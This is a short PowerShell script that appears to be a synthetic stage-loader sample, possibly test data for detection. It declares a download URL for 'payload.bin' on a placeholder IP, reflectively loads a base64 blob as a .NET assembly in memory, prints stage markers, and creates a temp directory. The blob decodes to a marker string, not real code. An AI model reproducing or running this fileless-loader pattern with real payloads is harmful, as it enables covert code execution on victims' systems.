
[CmdletBinding()]
param(
    [string]$FetchUrl = 'http://203.0.113.73/payload.bin',
    [int]$TimeoutSec = 119
)
$ErrorActionPreference = "Stop"

try {
    $PayloadBytes = [Convert]::FromBase64String("c3RhZ2UyLW1hcmtlcjpvN3JvdXpmMTR1")
    Write-Verbose ("Assembly byte count: " + $PayloadBytes.Length)
    $StageResult = [Reflection.Assembly]::Load($PayloadBytes)
    if ($null -ne $StageResult) {
        Write-Verbose ("Loaded assembly: " + $StageResult.FullName)
    }
}
catch {
    Write-Warning "Assembly load failed: $($_.Exception.Message)"
}

Write-Output "stage 15 initialized"
$StageMarker = "stage-16"
$null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force
